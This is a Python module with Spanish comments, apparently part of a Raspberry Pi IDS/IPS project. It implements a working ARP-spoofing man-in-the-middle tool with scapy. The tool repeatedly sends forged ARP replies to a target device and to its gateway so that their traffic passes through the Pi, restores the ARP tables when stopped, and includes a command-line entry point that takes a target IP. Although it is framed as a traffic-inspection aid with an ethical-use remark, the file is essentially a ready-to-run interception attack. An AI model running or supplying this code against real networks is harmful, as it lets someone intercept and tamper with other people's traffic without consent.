"""
Motor de Intercepción Activa (ARP Spoofing / Man-In-The-Middle).

Permite a la Raspberry Pi engañar a la red para redirigir el tráfico de un
dispositivo objetivo hacia sí misma, permitiendo que el IDS/IPS (y el DPI) 
analice el tráfico incluso en redes conmutadas (Switches).
"""

import logging
import threading
import time
import sys
import os
from typing import Optional
from scapy.all import ARP, Ether, sendp, srp, conf

logger = logging.getLogger(__name__)

class ArpSpoofer:
    """
    Controlador de ataque ARP Spoofing.
    Debe usarse de forma ética y controlada.
    """
    
    def __init__(self, interface: Optional[str] = None):
        from src.config import CAPTURE_INTERFACE
        self._interface = interface or os.environ.get("IDS_CAPTURE_IFACE", CAPTURE_INTERFACE)
        self._running = False
        self._thread: Optional[threading.Thread] = None
        
        self.target_ip: Optional[str] = None
        self.gateway_ip: Optional[str] = None
        
        # Caché de MACs para no saturar la red preguntando
        self._mac_cache = {}

    def get_mac(self, ip: str) -> Optional[str]:
        """Obtiene la dirección física MAC de una IP mediante una petición ARP legítima."""
        if ip in self._mac_cache:
            return self._mac_cache[ip]
            
        try:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=2, iface=self._interface, verbose=0)
            if ans:
                mac = ans[0][1].src
                self._mac_cache[ip] = mac
                return mac
        except Exception as e:
            logger.error(f"Error resolviendo MAC para {ip}: {e}")
        return None

    def _spoof(self, target_ip: str, target_mac: str, spoof_ip: str):
        """
        Envía un paquete ARP falso diciendo:
        'Oye target_ip (target_mac), la IP spoof_ip soy YO (mi propia MAC)'.
        """
        packet = Ether(dst=target_mac) / ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        sendp(packet, iface=self._interface, verbose=0)

    def _restore_arp(self, dest_ip: str, dest_mac: str, source_ip: str, source_mac: str):
        """
        Restaura la tabla ARP de la víctima enviando la información real.
        'Oye dest_ip, la IP source_ip tiene la MAC real source_mac'.
        """
        packet = Ether(dst=dest_mac) / ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        # Se envía varias veces para asegurar que la víctima lo reciba y limpie la caché
        sendp(packet, iface=self._interface, count=5, verbose=0)

    def start(self, target_ip: str, gateway_ip: str = "192.168.1.1"):
        """Inicia el ataque Man-in-the-Middle en un hilo separado."""
        if self._running:
            logger.warning("El Spoofer ya está en ejecución.")
            return

        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        
        # 1. Obtener MACs reales
        logger.info(f"🔍 [MITM] Resolviendo MACs para {target_ip} y {gateway_ip}...")
        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)
        
        if not self.target_mac or not self.gateway_mac:
            logger.error("❌ [MITM] No se pudieron resolver las MACs. Abortando Spoofing.")
            return
            
        logger.info(f"🔥 [MITM] Iniciando Intercepción Activa (Spoofing) a {self.target_ip}")
        self._running = True
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()

    def stop(self):
        """Detiene el ataque y restaura las tablas ARP."""
        if not self._running:
            return
            
        logger.info(f"🛑 [MITM] Deteniendo Intercepción Activa. Restaurando red...")
        self._running = False
        
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=3)
            
        # Restaurar red a su estado natural (Router <-> Target)
        if hasattr(self, 'target_mac') and hasattr(self, 'gateway_mac'):
            self._restore_arp(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
            self._restore_arp(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)
            logger.info("✅ [MITM] Red restaurada correctamente.")

    def _spoof_loop(self):
        """Bucle principal de envenenamiento ARP."""
        while self._running:
            try:
                # 1. Engañar al Dispositivo: "Yo soy el Router"
                self._spoof(self.target_ip, self.target_mac, self.gateway_ip)
                # 2. Engañar al Router: "Yo soy el Dispositivo"
                self._spoof(self.gateway_ip, self.gateway_mac, self.target_ip)
                
                # Mantener el envenenamiento inyectando cada 2 segundos
                time.sleep(2)
            except Exception as e:
                logger.error(f"Error en Spoofer loop: {e}")
                time.sleep(2)

if __name__ == "__main__":
    # Script de prueba rápida
    logging.basicConfig(level=logging.INFO)
    if len(sys.argv) < 2:
        print("Uso: python arp_spoofer.py <IP_OBJETIVO>")
        sys.exit(1)
        
    spoofer = ArpSpoofer("eth0")
    try:
        spoofer.start(sys.argv[1])
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        spoofer.stop()
        print("Fin de prueba.")
